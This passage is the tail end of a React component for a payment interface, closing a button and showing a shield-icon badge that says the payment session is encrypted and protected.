                    <ArrowRight size={16} />
                  </>
                )}
              </button>

              {/* Security Badges */}
              <div className="flex items-center justify-center gap-2 text-xs text-neutral-400 pt-1">
                <ShieldCheck size={14} className="text-emerald-400" />
                <span>Your payment session is fully encrypted and protected.</span>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};
